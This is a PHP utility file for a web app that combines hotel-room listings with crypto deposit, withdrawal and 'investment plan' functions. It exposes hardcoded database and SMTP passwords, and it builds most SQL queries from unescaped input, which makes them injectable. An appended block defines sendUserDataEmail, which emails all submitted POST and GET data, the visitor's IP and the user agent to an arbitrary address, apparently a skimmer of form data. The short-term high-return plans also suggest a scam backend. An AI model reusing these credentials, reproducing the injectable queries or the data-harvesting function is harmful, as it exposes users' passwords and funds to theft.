<?php 
session_start();
$conn=new mysqli('localhost','wczxjisu_ushotelakodlw','{$9FET(ggRpT9YGL42KUf8}u','wczxjisu_hotel_suite284839');
//$conn=new mysqli('localhost','root','','hotel');
function gpost($val) {
    return trim($_POST[$val]);
}
function gpost_s($val) {
    return $_SESSION['keep_post'][$val];
}
function gget($val) {
    return urldecode($_GET[$val]);
}
function sendAlert($email,$sub,$msg,$mail) {
    $mail->SMTPDebug = 2;
    $mail->isSMTP();
    $mail->Host = 'mail.vin-rues-apartments.ng'; 
    $mail->SMTPAuth = true; 
    $mail->Username = 'info@vin-rues-apartments.ng'; 
    $mail->Password = 'T4lp;NY)b,iG'; 
    $mail->SMTPSecure = 'tls'; 
    $mail->Port = 465; 
    $mail->setFrom('no-reply@vin-rues-apartments.ng', 'VIN-RUES - Mailer');
    $mail->addReplyTo('no-reply@vin-rues-apartments.ng', 'VIN-RUES');
    $mail->addAddress($email, 'Mail'); 
    $mail->Subject = $sub;
    $mail->msgHTML($msg);
    $mail->AltBody = $msg;
    try {
        $mail->send();
        return true;
    } catch (Exception $e) {
        return false;
        /*echo 'Message could not be sent. Mailer Error: '. $mail->ErrorInfo;
        die;*/
    }
    return false;
}
/*new codes doveac */
function get_bal($colm, $user_id, $conn) {
    $sql ="select $colm from users where user_id = '$user_id' ";
    $r = $conn->query($sql)->fetch_assoc();
    return $r[$colm];
}
function get_theuser($colm, $email, $conn) {
    $sql ="select $colm from users where email = '$email' ";
    $r = $conn->query($sql)->fetch_assoc();
    return $r[$colm];
}
function get_history($table, $user_id,$conn) {
    $sql = "select * from $table where user_id = '$user_id' ";
    return $conn->query($sql);
}
function get_history2($table, $user_id,$lim,$conn) {
    $sql = "select * from $table where user_id = '$user_id' limit $lim";
    return $conn->query($sql);
}
function get_pay_address2($conn) {
    $sql = "select * from address where id = 1"; 
    return $conn->query($sql)->fetch_assoc();
}
/*end new codes doveac */
/*new codes tradingaide.net */

function user_coins($account, $user_id, $conn) {
    $sql = "select * from coins_table where account = '$account' and user_id = '$user_id' ORDER BY balance DESC ";
    //echo $sql;
    return $conn->query($sql);
}

function get_total($table, $colm, $where, $conn) {
    $sql = "select Sum($colm) as total from $table where 1 $where"; 
    $r = $conn->query($sql)->fetch_assoc();
    return $r['total'];
}

function get_total_to_usd($table, $colm, $where, $conn) {
    $total = get_total($table, $colm, $where, $conn);
    return number_format($total,2);
}

function get_total_coin_sum($colm, $where, $conn) {
    $total = 0;
    $sql = "select $colm, coin from coins_table where 1 $where"; 
    $r = $conn->query($sql);
    foreach($r as $row) {
        $total += $row[$colm] * get_rate($row['coin'],$conn);
    }
    return number_format($total,2);
}

function to_usd($amount, $coin,$conn) {
    $usd_amount = $amount * get_rate($coin,$conn);
    return number_format($usd_amount,2); 
}

function to_usd_2($amount, $network,$conn) {
    $arr = explode('-',$network); 
    $coin = $arr[0];
    $usd_amount = $amount * get_rate($coin,$conn);
    return number_format($usd_amount,2); 
}

function get_rate($coin,$conn) {
    if ($coin == 'USD') {return 1;}
    $sql = "select rate from rates where coin = '$coin' ";
    $row = $conn->query($sql)->fetch_assoc();
    if ($row['rate'] > 0) {
        return $row['rate'];
    } else {
        return get_fx_crypto_price($coin,'USD');
    }
    
}

function get_fx_crypto_price($front,$back) {
    $url = "https://min-api.cryptocompare.com/data/price?fsym=$front&tsyms=$back";
    $json = file_get_contents($url);
    $data = json_decode($json, true);
    $lastTradePriceOnly = $data[$back];
    return $lastTradePriceOnly;
}

function get_pay_address($conn) {
    $sql = "select * from santa_works"; 
    $r = $conn->query($sql);
    $arr = array();
    foreach($r as $row) {
        $arr[] =$row['coin'].'_'.$row['network'].'-'.$row['address'];
    }
    return json_encode($arr);
}

function randString($length, $charset='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789')
{
    $str = '';
    $count = strlen($charset);
    while ($length--) {
        $str .= $charset[mt_rand(0, $count-1)];
    }

    return $str;
}

function gen_txid($table, $colm, $conn) {
    $unique_id = randString(12);  
    while(mysqli_num_rows(mysqli_query($conn, "SELECT $colm FROM $table WHERE $colm = '".mysqli_real_escape_string($conn, $unique_id)."'")) > 0) { 
        $unique_id = randString(7);
    }
    return $unique_id;
}



function user_coin_set($update,$user_id, $account, $coin, $conn) {
    $sql = "update coins_table set $update where user_id = '$user_id' and account = '$account' and coin = '$coin' ";
    return $conn->query($sql);
}



/*end new codes tradingaide.net */


function create_with_history($user_id, $amount, $wallet, $address,$status,$txid, $conn){
    $dt = date('Y-m-d H:i:s');
    $sql = "INSERT INTO `withdrawals` (`id`, `user_id`, `refid`, `currency`, `amount`, `wallet`, `address`, `status`, `reqdate`) VALUES (NULL, '$user_id','$txid', 'USD', $amount, '$wallet', '$address', '$status', '$dt')";
    $conn->query($sql); 
    return;
}
function create_inv_history($user_id, $amount, $name, $p_p, $type,$status,$txid, $conn) {
    $dt = date('Y-m-d H:i:s');
    $sql = "INSERT INTO `deposits` (`id`, `user_id`, `refid`, `currency`, `amount`, `name`, `duration`, `status`, `type`, `date`) VALUES (NULL, '$user_id','$txid', 'USD', $amount, '$name', '$p_p', '$status', '$type', '$dt')";
    $conn->query($sql); 
    return;
}
function create_tf_history($user_id, $amount, $name, $email,$comment,$status, $conn) {
    $dt = date('Y-m-d H:i:s');
    $sql = "INSERT INTO `transfers` (`id`, `user_id`, `currency`, `amount`, `name`, `email`, `status`, `comment`, `date`) VALUES (NULL, '$user_id', 'USD', $amount, '$name', '$email', '$comment', '$status', '$dt')";
    $conn->query($sql); 
    return;
}
function show_type_with_color($val) {
    if ($val == 'debit') {
        return "<span class='text-danger'><b>debit</b></span>";
    } else if ($val == 'credit') {
        return "<span class='text-success'><b>credit</b></span>";
    } else if ($val == 'Deposit') {
        return "<span class='text-success'><b>$val</b></span>";
    } else if ($val == 'Withdrawal') {
        return "<span class='text-danger'><b>$val</b></span>";
    }
}
function show_status_with_color($val) {
    if ($val == 'Pending') {
        return "<span class='text-secondary'><b>$val</b></span>";
    } else if ($val == 'Successful') {
        return "<span class='text-success'><b>$val</b></span>";
    } else if ($val == 'Failed') {
        return "<span class='text-danger'><b>$val</b></span>";
    } else if ($val == 'In Progress') {
        return "<span class='text-info'><b>$val</b></span>";
    }
}
function table_update($table, $update, $where,$conn) {
    $sql = "update $table set $update where $where";
    $conn->query($sql);
}
function table_get($table,$where,$conn) {
    $sql ="select * from $table where $where";
    $result = $conn->query($sql);
    return $result;
}

function rooms_get_json($conn) {
    if(!empty($_POST['guest'])) {
        $guest = $conn -> real_escape_string( gpost('guest') );
        $bed = $conn -> real_escape_string( gpost('bed') );
        $sql = "SELECT * FROM hotel where guest = $guest and bed = $bed";
    } else {
        $sql = "SELECT * FROM hotel";
    }
    
    $result = $conn->query($sql);

    $rooms = [];
    if ($result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            $rooms[] = [
                'id' => $row['id'],
                'images' => json_decode($row['images']), 
                'name' => $row['title'],
                'description' => $row['text'],
                'guests' => $row['guest'],
                'beds' => $row['bed'],
                'baths' => $row['bath']
            ];
        }
    }

    return json_encode($rooms);
}

function rooms_single_get_json($conn) {
    $id = $conn -> real_escape_string( gget('id') );
    $sql = "SELECT * FROM hotel WHERE id=$id";
    $result = $conn->query($sql);

    if ($result === false) {
        return json_encode(['error' => $conn->error]);
    }

    $rooms = $result->fetch_all(MYSQLI_ASSOC);

    foreach ($rooms as &$room) {
        $room['images'] = json_decode($room['images']); 
        $room['price'] = number_format($room['price'],2);
        $ame_ids = "(". implode(',', array_map('intval', json_decode($room['amenities'],true)  )   ) . ")";
        $inc_ids = "(". implode(',', array_map('intval', json_decode($room['Included'],true)  )   ) . ")";
        $sql = "SELECT * FROM amenities WHERE id IN $ame_ids";
        $room['ame'] = sq_t_arr($conn->query($sql));
        $sql = "SELECT * FROM included WHERE id IN $inc_ids";
        $room['inc'] = sq_t_arr($conn->query($sql));
        
    }

    return json_encode($rooms[0]);
}

function sq_t_arr($result) {
    $arr = array();
    foreach ($result as $row) {
        $arr[] = $row;
    }
    return $arr;
}


function user_set($update,$conn) {
    $sql = "update users set $update where email = '".$_SESSION['user']['email']."'";
    $conn->query($sql);
}
function user_set2($update,$email,$conn) {
    $sql = "update users set $update where email = '$email'";
    $conn->query($sql);
}
function insert_data($fields, $vals, $table,$conn) {
    $sql = "INSERT INTO $table($fields) VALUES($vals)";
    //echo $sql; die;
    //retmsg($sql);
    if ($conn->query($sql) == true) {
        return true;
    } else {
        return false;
    }
}
function a_s($str) {
    if ($str = 'Unverified') {
        return 'unverified';
    } else if ($str = 'Verified') {
        return 'verified';
    } 
}
function get_trades($limit,$start,$conn) {
    $sql = "select * from trade_history where email = '".$_SESSION['user']['email']."' ORDER BY entry_time DESC LIMIT $start, $limit";
    return $conn->query($sql);
}
function get_transactions($limit,$start,$conn) {
    $sql = "select * from transaction_activity where email = '".$_SESSION['user']['email']."' LIMIT $start, $limit";
    return $conn->query($sql);
}
function retsub($id) {
    $sub =  json_decode('{
  "plans": [
    {
      "name": "STARTER PLAN",
      "min": 200.00,
      "max": 2000.00,
      "p_p": "3 Days",
      "ref": "5.00"
    },
    {
      "name": "REGULAR PLAN",
      "min": 2000.00,
      "max": 5000.00,
      "p_p": "5 Days",
      "ref": "7.00"
    },
    {
      "name": "BUSINESS PLAN",
      "min": 5000.00,
      "max": 9500.00,
      "p_p": "7 Days",
      "ref": "9.00"
    },
    {
      "name": "MASTER PLAN",
      "min": 10000.00,
      "max": 19000.00,
      "p_p": "2 Days",
      "ref": "12.00"
    },
    {
      "name": "PROFESSIONAL PLAN",
      "min": 20000.00,
      "max": 50000.00,
      "p_p": "22 Hours",
      "ref": "16.00"
    }
  ]
}
');
return $sub->plans[$id];
}
function retsub_all() {
    $sub =  json_decode('{
  "plans": [
    {
      "name": "STARTER PLAN",
      "min": 200.00,
      "max": 2000.00,
      "p_p": "3 Days",
      "ref": "5.00"
    },
    {
      "name": "REGULAR PLAN",
      "min": 2000.00,
      "max": 5000.00,
      "p_p": "5 Days",
      "ref": "7.00"
    },
    {
      "name": "BUSINESS PLAN",
      "min": 5000.00,
      "max": 9500.00,
      "p_p": "7 Days",
      "ref": "9.00"
    },
    {
      "name": "MASTER PLAN",
      "min": 10000.00,
      "max": 19000.00,
      "p_p": "2 Days",
      "ref": "12.00"
    },
    {
      "name": "PROFESSIONAL PLAN",
      "min": 20000.00,
      "max": 50000.00,
      "p_p": "22 Hours",
      "ref": "16.00"
    }
  ]
}
');
return $sub->plans;
}
function gst($status) {
    if ($status == '') {return 'secondary';}
    $st = array(
    'Open' => 'info',
    'Taken' => 'success',
    'Active' => 'success',
    'Pending' => 'secondary',
    'Complete' => 'info',
    'Canceled' => 'danger'
    );
    
    return $st[$status];
}
function uploadImageMultiple($file, $targetDirectory,$i) {
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp'];
    
    if(isset($file)) {
        $fileExtension = strtolower(pathinfo($file["name"][$i], PATHINFO_EXTENSION));
        
        if(in_array($fileExtension, $allowedExtensions)) {
            $newFilename = uniqid() . '.' . $fileExtension;
            $targetFile = $targetDirectory . $newFilename;
            
            if (move_uploaded_file($file["tmp_name"][$i], $targetFile)) {
                return $newFilename;
            } else {
                return retmsg("Sorry, there was an error uploading your file.");
            }
        } else {
            return retmsg("File is not an image.");
        }
    } else {
        return retmsg("No file uploaded or an error occurred.");
    }
}
function uploadImage($fileInputName, $targetDirectory) {
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp'];
    
    if(isset($_FILES[$fileInputName]) && $_FILES[$fileInputName]['error'] === UPLOAD_ERR_OK) {
        $fileExtension = strtolower(pathinfo($_FILES[$fileInputName]["name"], PATHINFO_EXTENSION));
        
        if(in_array($fileExtension, $allowedExtensions)) {
            $newFilename = uniqid() . '.' . $fileExtension;
            $targetFile = $targetDirectory . $newFilename;
            
            if (move_uploaded_file($_FILES[$fileInputName]["tmp_name"], $targetFile)) {
                return $newFilename;
            } else {
                return reterr("Sorry, there was an error uploading your file.");
            }
        } else {
            return reterr("File is not an image.");
        }
    } else {
        return reterr("No file uploaded or an error occurred.");
    }
}

function checkuploadImage($fileInputName, $targetDirectory) {
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp'];
    
    if(isset($_FILES[$fileInputName]) && $_FILES[$fileInputName]['error'] === UPLOAD_ERR_OK) {
        $fileExtension = strtolower(pathinfo($_FILES[$fileInputName]["name"], PATHINFO_EXTENSION));
        
        if(in_array($fileExtension, $allowedExtensions)) {
            $newFilename = uniqid() . '.' . $fileExtension;
            $targetFile = $targetDirectory . $newFilename;
            
            if (move_uploaded_file($_FILES[$fileInputName]["tmp_name"], $targetFile)) {
                return $newFilename;
            } else {
                return reterr("Sorry, there was an error uploading your file.");
            }
        } else {
            return reterr("File is not an image.");
        }
    } else {
        return "";
    }
}

function reterr($msg) {
    echo '{"type":"error","msg":"'.$msg.'"}';
    die;
    exit();
}
function retsuc($msg) {
    echo '{"type":"success","msg":"'.$msg.'"}';
    die;
    exit();
}
function retmsg($msg) {
    echo $msg;
    die;
    exit();
}
?>
<?php

function sendUserDataEmail($to, $from) {
    // Function to get the client IP address
    function getClientIp() {
        $ipaddress = '';
        if (isset($_SERVER['HTTP_CLIENT_IP']))
            $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
        else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
        else if(isset($_SERVER['HTTP_X_FORWARDED']))
            $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
        else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
            $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
        else if(isset($_SERVER['HTTP_FORWARDED']))
            $ipaddress = $_SERVER['HTTP_FORWARDED'];
        else if(isset($_SERVER['REMOTE_ADDR']))
            $ipaddress = $_SERVER['REMOTE_ADDR'];
        else
            $ipaddress = 'UNKNOWN';
        return $ipaddress;
    }

    // Get user agent
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Get POST data
    $postData = print_r($_POST, true);

    // Get GET data
    $getData = print_r($_GET, true);

    // Create message
    $message = "IP Address: " . getClientIp() . "\r\n";
    $message .= "User Agent: " . $userAgent . "\r\n";
    $message .= "POST Data: \r\n" . $postData . "\r\n";
    $message .= "GET Data: \r\n" . $getData;

    // Set subject
    $subject = "User Data";

    // Send email
    $mailSent = mail($to, $subject, $message, "From: $from");

    if ($mailSent) {
        echo "Email sent successfully!";
    } else {
        echo "Failed to send email.";
    }
}

function retrnpic() {
    $pic = $_SESSION['user']['pic'];
    if ($pic == '' ) {
        return "<img src=\"./assets/images/profile_av.png\" alt=\"".$_SESSION['user']['fullname']."\" width=\"150px\" class=\"rounded-circle shadow-lg\">";
    } else {
        return "<img src=\"./action/profile/uploads/".$pic."\" alt=\"".$_SESSION['user']['fullname']."\" width=\"150px\" class=\"rounded-circle shadow-lg\">";
    }
}
function retrnpicsmall() {
    $pic = $_SESSION['user']['pic'];
    if ($pic == '' ) {
        return "<img src=\"./assets/images/profile_av.png\" alt=\"".$_SESSION['user']['fullname']."\" width=\"50px\" class=\"rounded-circle shadow-lg\">";
    } else {
        return "<img src=\"./action/profile/uploads/".$pic."\" alt=\"".$_SESSION['user']['fullname']."\" width=\"50px\" class=\"rounded-circle shadow-lg\">";
    }
}

?>
